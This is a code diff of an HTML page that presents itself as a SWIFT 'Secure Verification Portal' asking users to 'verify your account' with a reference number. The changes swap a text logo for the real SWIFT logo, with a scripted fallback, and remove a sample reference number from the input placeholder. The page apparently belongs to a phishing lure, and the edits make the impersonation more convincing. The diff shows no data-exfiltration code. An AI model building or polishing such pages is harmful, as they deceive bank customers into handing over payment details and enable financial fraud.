@@ -55,17 +55,17 @@
     }
     
     .logo {
-        width: 120px;
-        height: 40px;
-        background: #006b3c;
+        width: 150px;
+        height: 50px;
         margin: 0 auto 15px;
-        border-radius: 8px;
         display: flex;
         align-items: center;
         justify-content: center;
-        color: white;
-        font-weight: bold;
-        font-size: 18px;
+    }
+    
+    .logo img {
+        max-width: 100%;
+        height: auto;
     }
     
     .header h1 {
@@ -276,7 +276,10 @@
 <body>
 <div class="container">
     <div class="header">
-        <div class="logo">SWIFT</div>
+        <div class="logo">
+            <!-- SWIFT logo buraya əlavə edin -->
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/77/SWIFT_logo.svg/320px-SWIFT_logo.svg.png" alt="SWIFT Logo" onerror="this.style.display='none'; document.querySelector('.logo').innerHTML='SWIFT'; document.querySelector('.logo').style.background='#006b3c'; document.querySelector('.logo').style.color='white'; document.querySelector('.logo').style.borderRadius='8px';">
+        </div>
         <h1>Secure Verification Portal</h1>
         <p>Verify your account securely</p>
     </div>
@@ -292,7 +295,7 @@
     <div class="step active" id="step1">
         <div class="input-group">
             <label for="referenceNumber">Reference Number</label>
-            <input type="text" id="referenceNumber" placeholder="Enter COBA300525CH59279" required>
+            <input type="text" id="referenceNumber" placeholder="" required>
         </div>
         <button class="btn" id="step1Next">Continue</button>
         <div class="error" id="refError"></div>
